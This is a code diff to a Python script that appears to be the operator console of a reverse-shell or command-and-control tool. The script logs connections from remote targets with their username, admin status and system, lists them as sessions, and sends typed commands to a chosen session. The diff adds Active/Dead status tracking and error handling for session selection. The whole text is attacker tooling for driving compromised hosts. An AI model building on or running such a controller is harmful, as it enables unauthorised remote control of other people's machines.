@@ -79,7 +79,7 @@ def connection_handler():
             time_stamp = (
                 f"{date.month}/{date.day}/{date.year} {current_time}")
             sessions.append(
-                [remote_target, remote_ip[0], time_stamp, username, isAdmin, system])
+                [remote_target, remote_ip[0], time_stamp, username, isAdmin, system, 'Active'])
             print(
                 f'\n[*] Connection received from {remote_ip[0]} \nEnter command#> ', end='')
 
@@ -111,6 +111,7 @@ def session_handler(session_id):
         if message == 'exit':
             outbound_message(session_id, message)
             session_id.close()
+            sessions[num - 1][6] = 'Dead'
             break
         if message == 'background':
             break
@@ -277,13 +278,19 @@ if __name__ == '__main__':
                     table.padding_width = 2
                     for target in sessions:
                         table.add_row(
-                            [session_counter, 'Placeholder', target[3], target[4], target[1], target[5], target[2]])
+                            [session_counter, target[6], target[3], target[4], target[1], target[5], target[2]])
                         session_counter += 1
                     print(table)
                 if command.split(' ')[1] == '-i':
-                    num = int(command.split(' ')[2])
-                    session_id = (sessions[num - 1])[0]
-                    session_handler(session_id)
+                    try:
+                        num = int(command.split(' ')[2])
+                        session_id = (sessions[num - 1])[0]
+                        if sessions[num - 1][6] != 'Dead':
+                            session_handler(session_id)
+                        else:
+                            print(f'[-] Session {num} is dead.')
+                    except IndexError:
+                        print(f'[-] Session {num} does not exist.')
             if command == 'exit':
                 should_close_socket = True
                 sock.close()
